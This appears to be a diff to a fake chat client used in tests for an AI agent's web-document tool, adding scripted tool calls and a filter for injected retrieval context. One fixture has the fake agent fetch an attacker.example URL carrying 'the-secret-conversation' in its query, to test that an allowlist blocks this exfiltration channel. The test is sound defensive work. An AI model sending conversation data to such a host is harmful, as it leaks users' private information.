@@ -1,5 +1,6 @@
 using System.Diagnostics;
 using System.Runtime.CompilerServices;
+using System.Text.RegularExpressions;
 using Agent42.Agents;
 using Microsoft.Agents.AI;
 using Microsoft.Extensions.AI;
@@ -19,7 +20,7 @@ namespace Agent42.Tests;
 /// spike), but the marker also inspects system-role messages so the echo is robust if that
 /// delivery path ever changes.
 /// </summary>
-public sealed class FakeChatClient : IChatClient
+public sealed partial class FakeChatClient : IChatClient
 {
     private static readonly string[] ReplyChunks = ["Hello! ", "How can I ", "help you today?"];
 
@@ -200,7 +201,16 @@ public sealed class FakeChatClient : IChatClient
             && value is AgentRequestMessageSourceAttribution attribution
             && attribution.SourceType == AgentRequestMessageSourceType.AIContextProvider);
 
-        return injected is { Text: { Length: > 0 } text } ? $"[ctx:{text}] " : "";
+        if (injected is not { Text: { Length: > 0 } text })
+        {
+            return "";
+        }
+
+        // Trimmed for the same reason ToolResultEcho is, and it became load-bearing once a document could
+        // be cap-sized (ADR 0066): the injected excerpts are deliberately NOT persisted, but this echo
+        // puts them into the ASSISTANT's reply, which is — so an untrimmed echo inflates the very session
+        // item the budget test measures, purely as a fake artifact.
+        return $"[ctx:{(text.Length > 400 ? text[..400] : text)}] ";
     }
 
     // Surfaces the tool results the client can see on this invocation as a [tool:…] marker, so a test
@@ -297,6 +307,55 @@ public sealed class FakeChatClient : IChatClient
         {
             ["name"] = "location-check",
             ["prompt"] = "where am i",
+            ["dueInMinutes"] = 1.0,
+            ["repeatEveryMinutes"] = 60.0,
+        });
+
+    // read_web_document (ADR 0066) against a URL the user pasted in the same message, so it is
+    // allowlisted by RememberFetchableUrlsInUserText before the model call.
+    //
+    // The URL is READ OUT OF THE PROMPT rather than hardcoded, because the tool is idempotent per URL
+    // (ADR 0066): a fixed URL would make every call after the first short-circuit, and a test about the
+    // per-conversation document cap could never reach it. Falls back to the canonical one when the
+    // prompt carries none — the reminder path's model-authored prompt does not.
+    private static FunctionCallContent BuildReadWebDocumentCall(string text) =>
+        new("read-document-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
+        {
+            ["url"] = UrlInPrompt().Match(text) is { Success: true } m ? m.Value : "https://example.com/manual.pdf",
+            ["question"] = "what does the manual say about dolphins",
+        });
+
+    [GeneratedRegex(@"https?://\S+")]
+    private static partial Regex UrlInPrompt();
+
+    // The same tool against a URL NOBODY produced — no search returned it and the user never wrote it.
+    // The exfiltration channel FetchableUrls exists to close, on the document path this time.
+    private static FunctionCallContent BuildReadUnlistedWebDocumentCall() =>
+        new("read-document-call-2", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
+        {
+            ["url"] = "https://attacker.example/collect.pdf?q=the-secret-conversation",
+            ["question"] = "summarise this",
+        });
+
+    // A URL InMemoryWebDocumentFetcher is rigged to fail on, so a test can prove a fetch failure comes
+    // back to the model as a message rather than a thrown turn. The URL is one the user pasted, so it is
+    // allowlisted; the marker in its path is what makes the fake throw.
+    private static FunctionCallContent BuildReadBrokenWebDocumentCall() =>
+        new("read-document-call-3", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
+        {
+            ["url"] = $"https://example.com/{InMemoryWebDocumentFetcher.FailureTriggerUrlMarker}.pdf",
+            ["question"] = "summarise this",
+        });
+
+    // Schedules a reminder whose PROMPT asks for the manual to be read. When it fires, that prompt comes
+    // back as a user message and this client answers it with a read_web_document call — which is what
+    // lets ReadWebDocument_AttachesRetrievalAfterReminderTurn observe the REMINDER consume site. Nothing
+    // else on that path would ever ingest a document, and missing that site is a silent bug (ADR 0066).
+    private static FunctionCallContent BuildDocumentReminderCall() =>
+        new("document-reminder-call-1", "schedule_prompt", new Dictionary<string, object?>
+        {
+            ["name"] = "read-the-manual",
+            ["prompt"] = "read the manual",
             ["dueInMinutes"] = 1.0,
             ["repeatEveryMinutes"] = 60.0,
         });
@@ -409,16 +468,31 @@ public sealed class FakeChatClient : IChatClient
         ("fetch and follow", _ => BuildFetchWithFollowCall()),
         ("fetch the broken page", _ => BuildFetchFailingCall()),
         ("read the first result", _ => BuildFetchSearchResultCall()),
+        // read_web_document (ADR 0066). All four sit AFTER the fetch rows and are worded so they cannot
+        // collide with any of them: "read the manual" shares no substring with "read the first result",
+        // and "schedule a document read" contains neither "cancel" nor "remind".
+        ("schedule a document read", _ => BuildDocumentReminderCall()),
+        ("read the secret document", _ => BuildReadUnlistedWebDocumentCall()),
+        ("read the broken document", _ => BuildReadBrokenWebDocumentCall()),
+        ("read the manual", BuildReadWebDocumentCall),
         ("look up", BuildWebSearchCall),
         ("schedule a location check", _ => BuildLocationReminderCall()),
         ("where am i", _ => BuildGetCurrentLocationCall()),
     ];
 
+    // The last message the USER actually sent.
+    //
+    // The role alone is not enough, and getting this wrong is subtle: a TextSearchProvider injects its
+    // retrieved excerpts as a ChatRole.User message too (ADR 0008 — the source ATTRIBUTION, not the role,
+    // is what distinguishes them; see ContextEcho). So in any conversation that has a document, the last
+    // user-role message is the excerpt block rather than the prompt — and a fake that keyed on it would
+    // silently stop calling tools the moment retrieval switched on, which reads exactly like the tool
+    // being broken. A real model sees both messages and answers the user's.
     private static int LastUserIndex(IReadOnlyList<ChatMessage> list)
     {
         for (var i = list.Count - 1; i >= 0; i--)
         {
-            if (list[i].Role == ChatRole.User)
+            if (list[i].Role == ChatRole.User && !IsInjectedContext(list[i]))
             {
                 return i;
             }
@@ -426,4 +500,11 @@ public sealed class FakeChatClient : IChatClient
 
         return -1;
     }
+
+    private static bool IsInjectedContext(ChatMessage message)
+        => message.AdditionalProperties is not null
+            && message.AdditionalProperties.TryGetValue(
+                AgentRequestMessageSourceAttribution.AdditionalPropertiesKey, out var value)
+            && value is AgentRequestMessageSourceAttribution attribution
+            && attribution.SourceType == AgentRequestMessageSourceType.AIContextProvider;
 }
